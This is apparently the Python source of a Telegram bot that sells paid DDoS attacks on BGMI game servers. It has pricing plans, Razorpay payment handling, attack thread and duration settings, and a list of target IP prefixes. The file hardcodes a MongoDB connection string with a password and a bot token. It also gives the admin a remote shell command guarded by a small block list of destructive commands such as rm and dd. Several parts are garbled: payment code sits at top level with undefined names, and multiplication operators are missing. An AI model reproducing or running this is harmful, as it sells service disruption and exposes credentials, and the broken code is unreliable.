import os
import socket
import subprocess
import asyncio
import pytz
import platform
import random
import razorpay
import string
import psutil
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler, CallbackQueryHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone
import uuid

# Database Configuration
MONGO_URI = 'mongodb+srv://nedop17612:ZnXnERM6swVt16gc@cluster0.hhq4k.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['TEST']
users_collection = db['users']
settings_collection = db['settings']
redeem_codes_collection = db['redeem_codes']
attack_logs_collection = db['user_attack_logs']
allowed_groups_collection = db['allowed_groups']
txn_history_collection = db['txn_history']
referrals_collection = db['referrals']
RAZORPAY_KEY = "YOUR_RAZORPAY_KEY"
RAZORPAY_SECRET = "YOUR_RAZORPAY_SECRET"
client = razorpay.Client(auth=(RAZORPAY_KEY, RAZORPAY_SECRET))
order = client.order.create({'amount': amount * 100, 'currency': 'INR', 'notes': {'user_id': user_id, 'plan': plan}})
qr_code_url = "YOUR_PAYMENT_GATEWAY_QR_CODE_URL"  # Fetch from API response
await query.message.reply_text(msg + f"\nQR Code: {qr_code_url}", parse_mode='Markdown')
payment = client.order.payments(order_id)
if payment['status'] == 'captured':
    actual_amount = payment['amount'] / 100
    days = int(actual_amount / 120)  # Adjust based on your pricing logic
    expiry_date = datetime.now(timezone.utc) + timedelta(days=days)
    users_collection.update_one({"user_id": user_id}, {"$set": {"expiry_date": expiry_date}}, upsert=True)
    txn_history_collection.update_one({"order_id": order_id}, {"$set": {"status": "success"}})
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Payment Verified!*\nYou now have access for {days} day(s)!", parse_mode='Markdown')
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7516323992:AAFU8SdUJWeWfuuvFYtEU3GUSZDtaW5g5As'
ADMIN_USER_ID = 1929943036
FEEDBACK_CHAT_ID = 1929943036
COOLDOWN_PERIOD = timedelta(minutes=5)
user_last_attack_time = {}
user_attack_history = {}
cooldown_dict = {}
active_processes = {}
current_directory = os.getcwd()
BOT_START_TIME = time.time()

# Default values
DEFAULT_BYTE_SIZE = 5
DEFAULT_THREADS = 5
DEFAULT_MAX_ATTACK_TIME = 100
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')
LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
PROTECTED_FILES = ["LEGEND.py", "LEGEND"]
BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']

# Pricing plans
PLANS = {
    "1 Day": 120,
    "2 Day": 190,
    "3 Day": 280,
    "4 Day": 350,
    "5 Day": 400,
    "6 Day": 1450,
    "7 Day": 500
}

# Function to get dynamic user and host
def get_user_and_host():
    try:
        user = os.getlogin()
        host = socket.gethostname()
        if 'CODESPACE_NAME' in os.environ:
            user = os.environ['CODESPACE_NAME']
            host = 'github.codespaces'
        if platform.system() == 'Linux' and 'CLOUD_PLATFORM' in os.environ:
            user = os.environ.get('USER', 'clouduser')
            host = os.environ.get('CLOUD_HOSTNAME', socket.gethostname())
        return user, host
    except Exception:
        return 'user', 'hostname'

# Function to create main menu keyboard
def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("Attack", callback_data='attack')],
        [InlineKeyboardButton("BGMI", callback_data='bgmi')],
        [InlineKeyboardButton("Pay Now", callback_data='pay_now')],
        [InlineKeyboardButton("Check Balance", callback_data='check_balance')],
        [InlineKeyboardButton("Refer & Earn", callback_data='refer_earn')],
        [InlineKeyboardButton("Leaderboard", callback_data='leaderboard')],
        [InlineKeyboardButton("Trial", callback_data='trial')],
        [InlineKeyboardButton("Txn History", callback_data='txn_history')]
    ]
    return InlineKeyboardMarkup(keyboard)

# Function to execute terminal commands
async def execute_terminal(update: Update, context: CallbackContext):
    global current_directory
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to execute terminal commands!", parse_mode='Markdown')
        return
    if not context.args:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /terminal <command>", parse_mode='Markdown')
        return
    command = ' '.join(context.args)
    if any(command.startswith(blocked_cmd) for blocked_cmd in BLOCKED_COMMANDS):
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Command '{command}' is not allowed!", parse_mode='Markdown')
        return
    if command.startswith('cd '):
        new_directory = command[3:].strip()
        absolute_path = os.path.abspath(os.path.join(current_directory, new_directory))
        if os.path.isdir(absolute_path):
            current_directory = absolute_path
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"📂 Changed directory to: `{current_directory}`", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Directory not found: `{new_directory}`", parse_mode='Markdown')
        return
    try:
        user, host = get_user_and_host()
        current_dir = os.path.basename(current_directory) if current_directory != '/' else ''
        prompt = f"{user}@{host}:{current_dir}$ "
        result = await asyncio.create_subprocess_shell(command, cwd=current_directory, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await result.communicate()
        output = stdout.decode().strip() or stderr.decode().strip()
        if not output:
            output = "No output or error from the command."
        if len(output) > 4000:
            output = output[:4000] + "\n⚠️ Output truncated due to length."
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"💻 Command Output:\n{prompt}\n```{output}```", parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Error executing command:\n```{str(e)}```", parse_mode='Markdown')

# Function to handle uploads
async def upload(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to upload files!", parse_mode='Markdown')
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Please reply to a file message with /upload to process it.", parse_mode='Markdown')
        return
    document = update.message.reply_to_message.document
    file_name = document.file_name
    file_path = os.path.join(os.getcwd(), file_name)
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive(file_path)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ File '{file_name}' has been uploaded successfully!", parse_mode='Markdown')

# Function to check if group is allowed
async def is_group_allowed(group_id):
    group = allowed_groups_collection.find_one({"group_id": group_id})
    if group:
        expiry_date = group['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        if expiry_date > datetime.now(timezone.utc):
            return True
    return False

# Function to add group
async def add_group(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to add groups!", parse_mode='Markdown')
        return
    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /addgroup <group_id> <days/minutes>", parse_mode='Markdown')
        return
    try:
        target_group_id = int(context.args[0])
        time_input = context.args[1]
        if time_input[-1].lower() == 'd':
            time_value = int(time_input[:-1])
            total_seconds = time_value  86400
            expiry_label = f"{time_value} day(s)"
        elif time_input[-1].lower() == 'm':
            time_value = int(time_input[:-1])
            total_seconds = time_value  60
            expiry_label = f"{time_value} minute(s)"
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Please specify time in days (d) or minutes (m).", parse_mode='Markdown')
            return
        expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)
        allowed_groups_collection.update_one({"group_id": target_group_id}, {"$set": {"expiry_date": expiry_date}}, upsert=True)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Group {target_group_id} added with expiry in {expiry_label}.", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Error: {e}", parse_mode='Markdown')

# Function to list files
async def list_files(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to list files!", parse_mode='Markdown')
        return
    directory = context.args[0] if context.args else os.getcwd()
    if not os.path.isdir(directory):
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Directory not found: `{directory}`", parse_mode='Markdown')
        return
    try:
        files = os.listdir(directory)
        if files:
            files_list = "\n".join(files)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"📂 Files in Directory: `{directory}`\n{files_list}", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"📂 No files in the directory: `{directory}`", parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Error accessing the directory: `{str(e)}`", parse_mode='Markdown')

# Function to delete files
async def delete_file(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to delete files!", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /delete <file_name>", parse_mode='Markdown')
        return
    file_name = context.args[0]
    file_path = os.path.join(os.getcwd(), file_name)
    if file_name in PROTECTED_FILES:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ File '{file_name}' is protected and cannot be deleted.", parse_mode='Markdown')
        return
    if os.path.exists(file_path):
        os.remove(file_path)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ File '{file_name}' has been deleted.", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ File '{file_name}' not found.", parse_mode='Markdown')

# Help command
async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        help_text = (
            "Here are the commands you can use: \n\n"
            "🔸 /start - start interacting with the bot.\n"
            "🔸 /attack - Trigger an attack operation.\n"
            "🔸 /bgmi - Trigger a BGMI attack.\n"
            "🔸 /price - bot price.\n"
            "🔸 /dailyreward - dailyreward 1 free attack.\n"
            "🔸 /info - user info.\n"
            "🔸 /spin - spin and wait for your luck.\n"
            "🔸 /redeem - Redeem a code.\n"
            "🔸 /feedback - send feedback to admin.\n"
        )
    else:
        help_text = (
            "💡 Available Commands for Admins:\n\n"
            "🔸 /start - start the bot.\n"
            "🔸 /attack - Start the attack.\n"
            "🔸 /bgmi - Start a BGMI attack.\n"
            "🔸 /add [user_id] - Add a user.\n"
            "🔸 /remove [user_id] - Remove a user.\n"
            "🔸 /thread [number] - Set number of threads.\n"
            "🔸 /byte [size] - Set the byte size.\n"
            "🔸 /show - Show current settings.\n"
            "🔸 /users - List all allowed users.\n"
            "🔸 /user_info - user info.\n"
            "🔸 /broadcast - Broadcast a Message.\n"
            "🔸 /gen - Generate a redeem code.\n"
            "🔸 /redeem - Redeem a code.\n"
            "🔸 /addgroup - addgroup.\n"
            "🔸 /price - bot price.\n"
            "🔸 /ping - Check code.\n"
            "🔸 /cleanup - Clean up stored data.\n"
            "🔸 /argument [type] - Set the (3, 4, or 5).\n"
            "🔸 /delete_code - Delete a redeem code.\n"
            "🔸 /list_codes - List all redeem codes.\n"
            "🔸 /set_time - Set max attack time.\n"
            "🔸 /log [user_id] - View attack history.\n"
            "🔸 /delete_log [user_id] - Delete history.\n"
            "🔸 /upload - Upload a file.\n"
            "🔸 /ls - List files in the directory.\n"
            "🔸 /delete [filename] - Delete a file.\n"
            "🔸 /terminal [command] - Execute.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown', reply_markup=get_main_menu())

# Start command with buttons
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user = update.effective_user
    user_id = user.id
    username = user.username or "Unknown"
    is_allowed = await is_user_allowed(user_id)
    status_emoji = "🟢 Approved" if is_allowed else "⚠️ Not Approved"
    message = (
        f"⚡ Welcome to the battlefield, {username.upper()}! ⚡\n\n"
        f"👤 User ID: {user_id}\n"
        f"🔴 Status: {status_emoji}\n\n"
        f"💰 Pricing for the bot services: /price\n\n"
        "Use the buttons below to interact:"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='HTML', reply_markup=get_main_menu())

# Add user
async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to add users!", parse_mode='Markdown')
        return
    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /add <user_id> <days/minutes>", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    time_input = context.args[1]
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        total_seconds = time_value  86400
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        total_seconds = time_value  60
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Please specify time in days (d) or minutes (m).", parse_mode='Markdown')
        return
    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)
    users_collection.update_one({"user_id": target_user_id}, {"$set": {"expiry_date": expiry_date}}, upsert=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.", parse_mode='Markdown')

# Remove user
async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to remove users!", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /remove <user_id>", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ User {target_user_id} removed.", parse_mode='Markdown')

# Set threads
async def set_thread(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to set the number of threads!", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /thread <number of threads>", parse_mode='Markdown')
        return
    try:
        threads = int(context.args[0])
        if threads <= 0:
            raise ValueError("Number of threads must be positive.")
        settings_collection.update_one({"setting": "threads"}, {"$set": {"value": threads}}, upsert=True)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Number of threads set to {threads}.", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Error: {e}", parse_mode='Markdown')

# Set byte size
async def set_byte(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to set the byte size!", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /byte <byte size>", parse_mode='Markdown')
        return
    try:
        byte_size = int(context.args[0])
        if byte_size <= 0:
            raise ValueError("Byte size must be positive.")
        settings_collection.update_one({"setting": "byte_size"}, {"$set": {"value": byte_size}}, upsert=True)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Byte size set to {byte_size}.", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Error: {e}", parse_mode='Markdown')

# Show settings
async def show_settings(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to view settings!", parse_mode='Markdown')
        return
    byte_size_setting = settings_collection.find_one({"setting": "byte_size"})
    threads_setting = settings_collection.find_one({"setting": "threads"})
    argument_type_setting = settings_collection.find_one({"setting": "argument_type"})
    max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
    byte_size = byte_size_setting["value"] if byte_size_setting else DEFAULT_BYTE_SIZE
    threads = threads_setting["value"] if threads_setting else DEFAULT_THREADS
    argument_type = argument_type_setting["value"] if argument_type_setting else 3
    max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else 60
    settings_text = (
        f"Current Bot Settings:\n"
        f"🗃️ Byte Size: {byte_size}\n"
        f"🔢 Threads: {threads}\n"
        f"🔧 Argument Type: {argument_type}\n"
        f"⏲️ Max Attack Time: {max_attack_time} seconds\n"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=settings_text, parse_mode='Markdown')

# List users
async def list_users(update, context):
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()
    user_list_message = "👥 User List:\n"
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = -0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        if expired:
            user_list_message += f"🔴 User ID: {user_id} - Expiry: {expiry_label}\n"
        else:
            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

# Check if user is allowed
async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

# Broadcast message
async def broadcast_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="<b>❌ You are not authorized to broadcast messages!</b>", parse_mode='HTML')
        return

    if not context.args and not update.message.reply_to_message:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="<b>⚠️ Usage: /broadcast &lt;message&gt; or reply to a photo/video/message with /broadcast.</b>", parse_mode='HTML')
        return

    users = users_collection.find({}, {"user_id": 1})
    success_count = 0
    failure_count = 0

    if update.message.reply_to_message:
        reply_message = update.message.reply_to_message
        caption = reply_message.caption or "Broadcast Message"

        if reply_message.photo:
            photo = reply_message.photo[-1].file_id
            for user in users:
                try:
                    await context.bot.send_photo(
                        chat_id=user['user_id'],
                        photo=photo,
                        caption=f"<b>🔊 Broadcast Message:</b><br><br>{caption}",
                        parse_mode='HTML'
                    )
                    success_count += 1
                except Exception as e:
                    print(f"Failed to send photo broadcast to user {user['user_id']}: {e}")
                    failure_count += 1
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"<b>✅ Broadcast photo sent!</b><br>📬 Successful: {success_count}<br>⚠️ Failed: {failure_count}",
                parse_mode='HTML'
            )
        elif reply_message.video:
            video = reply_message.video.file_id
            for user in users:
                try:
                    await context.bot.send_video(
                        chat_id=user['user_id'],
                        video=video,
                        caption=f"<b>🔊 Broadcast Message:</b><br><br>{caption}",
                        parse_mode='HTML'
                    )
                    success_count += 1
                except Exception as e:
                    print(f"Failed to send video broadcast to user {user['user_id']}: {e}")
                    failure_count += 1
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"<b>✅ Broadcast video sent!</b><br>📬 Successful: {success_count}<br>⚠️ Failed: {failure_count}",
                parse_mode='HTML'
            )
        elif reply_message.text:
            text = reply_message.text
            for user in users:
                try:
                    await context.bot.send_message(
                        chat_id=user['user_id'],
                        text=f"<b>🔊 Broadcast Message:</b><br><br>{text}",
                        parse_mode='HTML'
                    )
                    success_count += 1
                except Exception as e:
                    print(f"Failed to send text broadcast to user {user['user_id']}: {e}")
                    failure_count += 1
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"<b>✅ Broadcast message sent!</b><br>📬 Successful: {success_count}<br>⚠️ Failed: {failure_count}",
                parse_mode='HTML'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="<b>⚠️ Please reply to a photo, video, or text message with /broadcast.</b>",
                parse_mode='HTML'
            )
    else:
        broadcast_message = ' '.join(context.args)
        for user in users:
            try:
                await context.bot.send_message(
                    chat_id=user['user_id'],
                    text=f"<b>🔊 Broadcast Message:</b><br><br>{broadcast_message}",
                    parse_mode='HTML'
                )
                success_count += 1
            except Exception as e:
                print(f"Failed to send broadcast to user {user['user_id']}: {e}")
                failure_count += 1
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<b>✅ Broadcast completed!</b><br><br>📬 Successful: {success_count}<br>⚠️ Failed: {failure_count}",
            parse_mode='HTML'
        )

# Price command
async def price(update: Update, context: CallbackContext):
    username = update.effective_user.username or update.effective_user.first_name or "User"
    message = (
        f"⚡ Hello, {username.upper()}! ⚡\n\n"
        "👑 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝟐𝟒/𝟕  𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 🔝\n\n"
        "👑 𝟭 D𝗔𝗬 :- 130₹ 💵\n"
        "👑 𝟮 𝗗𝗔𝗬 :- 190₹ 💵\n"
        "👑 𝟯 𝗗𝗔𝗬 :- 280₹ 💵\n"
        "👑 𝟰 D𝗔𝗬 :- 350₹ 💵\n"
        "👑 𝟱 𝗗𝗔𝗬 :- 400₹ 💵\n"
        "👑 𝟲 𝗗𝗔𝗬 :- 450₹ 💵\n"
        "👑 𝟳 𝗗𝗔𝗬 :- 500₹ 💵\n\n"
        "📱 𝐈𝐎𝐒 + 𝐀𝐍𝐃𝐑𝐎𝐈𝐃  𝐃𝐃𝐎𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 ➡️✔️\n\n"
        "💎 𝗗𝗠 𝗙𝗢𝗥 𝗕𝗨𝗬 :- \n"
        "@Jon00897 ✅️"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='HTML')

# Status command
async def status(update: Update, context: CallbackContext):
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_str = str(timedelta(seconds=uptime_seconds))
    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    status_message = (
        "📊 Bot Status:\n\n"
        f"⏳ Bot Running Time: {uptime_str}\n"
        f"💻 CPU Usage: {cpu_usage}%\n"
        f"💾 RAM Usage: {ram_usage}%"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=status_message, parse_mode="Markdown")

# Feedback command
async def feedback(update: Update, context: CallbackContext):
    user = update.effective_user
    message = update.message
    if message.photo:
        photo = message.photo[-1].file_id
        feedback_text = message.caption if message.caption else "No text provided"
        await context.bot.send_photo(chat_id=FEEDBACK_CHAT_ID, photo=photo, caption=f"📬 New Feedback from @{user.username} ({user.id}):\n\n{feedback_text}", parse_mode="Markdown")
        await message.reply_text("✅ Your feedback (photo) has been sent!")
    else:
        await message.reply_text("❌ Please send a photo with your feedback.")

# Ping command
async def ping(update: Update, context: CallbackContext):
    start_time = time.time()
    message = await update.message.reply_text("🏓 Pinging...")
    end_time = time.time()
    latency = (end_time - start_time)  1000
    await message.edit_text(f"🏓 Pong! `{int(latency)}ms`", parse_mode="Markdown")

# Spin command
async def spin(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    plans = [
        "👑 𝟏 𝐃𝐀𝐘 :- 100₹ 💎",
        "👑 𝟐 𝐃𝐀𝐘 :- 200₹ 💎",
        "👑 𝟑 𝐃𝐀𝐘 :- 300₹ 💎",
        "👑 𝟒 𝐃𝐀𝐘 :- 400₹ 💎",
        "👑 𝟓 𝐃𝐀𝐘 :- 500₹ 💎",
        "👑 𝟔 𝐃𝐀𝐘 :- 600₹ 💎",
        "👑 FREE :- 1 HOURS 💎"
    ]
    message = await update.message.reply_text("🎰 Spinning...")
    for _ in range(5):
        fake_spin = random.choice(plans)
        await asyncio.sleep(1)
        await message.edit_text(f"🎰 Spinning...\n🔄 {fake_spin}")
    final_result = random.choice(plans)
    if random.random() < 0.05:
        final_result = "👑 FREE :- 1 HOURS 💎"
    await message.edit_text(f"🎉 Your Spin Result:\n\n{final_result}", parse_mode="Markdown")
    await update.message.reply_text("📸 Please take a screenshot of this plan and send it to admin @Jon00897.")

# Info command
async def info(update: Update, context: CallbackContext):
    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name or "User"
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and "expiry_date" in user_data:
        expiry = user_data["expiry_date"]
        if expiry.tzinfo is None:
            expiry = expiry.replace(tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        remaining = expiry - now
        if remaining.total_seconds() > 0:
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            status = "🟢 Approved"
        else:
            days = hours = minutes = 0
            status = "🔴 Expired"
        expiry_str = expiry.strftime('%Y-%m-%d %H:%M')
        msg = (
            f"👤 <b>Username:</b> @{username}\n"
            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
            f"🔍 <b>Status:</b> {status}\n"
            f"📅 <b>Expires At:</b> {expiry_str}\n"
            f"⏳ <b>Time Left:</b> {days}d {hours}h {minutes}m"
        )
    else:
        msg = (
            f"👤 <b>Username:</b> @{username}\n"
            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
            f"🔍 <b>Status:</b> ⚠️ Not Approved\n"
            f"💡 Use /redeem to activate your plan."
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=msg, parse_mode='HTML')

# Daily reward
async def dailyreward(update: Update, context: CallbackContext):
    user = update.effective_user
    user_id = user.id
    now = datetime.now(timezone.utc)
    user_data = users_collection.find_one({"user_id": user_id})
    if not user_data:
        users_collection.insert_one({"user_id": user_id, "last_reward": now - timedelta(days=1)})
        user_data = users_collection.find_one({"user_id": user_id})
    last_claim = user_data.get("last_reward", now - timedelta(days=1))
    if (now - last_claim).total_seconds() < 86400:
        remaining = timedelta(seconds=86400 - (now - last_claim).total_seconds())
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 240)
        return await context.bot.send_message(chat_id=user_id, text=f"⏳ You already claimed your daily reward!\nCome back in {hours}h {minutes}m.", parse_mode="HTML")
    users_collection.update_one({"user_id": user_id}, {"$set": {"last_reward": now}})
    await context.bot.send_message(chat_id=user_id, text="🎁 <b>Daily Reward Claimed!</b>\nYou've received 1 free 240-second attack today!\nUse it wisely!", parse_mode="HTML")

# User info for admin
async def user_info(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to use this command!", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /user_info <user_id>", parse_mode='Markdown')
        return
    try:
        target_user_id = int(context.args[0])
        user = users_collection.find_one({"user_id": target_user_id})
        if not user:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ User not found in the database.", parse_mode='Markdown')
            return
        expiry_date = user.get("expiry_date")
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        remaining = expiry_date - datetime.now(timezone.utc)
        remaining_str = f"{remaining.days}D-{remaining.seconds // 3600}H-{(remaining.seconds % 3600) // 60}M"
        message = (
            f"👤 User Info:\n"
            f"• User ID: `{target_user_id}`\n"
            f"• Expiry Date: {expiry_date.strftime('%Y-%m-%d %H:%M %Z')}\n"
            f"• Time Remaining: {remaining_str}"
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Invalid user ID provided.", parse_mode='Markdown')

# Set argument type
async def set_argument(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to set the argument!", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /argument <3|4|5>", parse_mode='Markdown')
        return
    try:
        argument_type = int(context.args[0])
        if argument_type not in [3, 4, 5]:
            raise ValueError("Argument must be 3, 4, or 5.")
        settings_collection.update_one({"setting": "argument_type"}, {"$set": {"value": argument_type}}, upsert=True)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Argument type set to {argument_type}.", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Error: {e}", parse_mode='Markdown')

# Set max attack time
async def set_max_attack_time(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to set the max attack time!", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /set_time <max time in seconds>", parse_mode='Markdown')
        return
    try:
        max_time = int(context.args[0])
        if max_time <= 0:
            raise ValueError("Max time must be a positive integer.")
        settings_collection.update_one({"setting": "max_attack_time"}, {"$set": {"value": max_time}}, upsert=True)
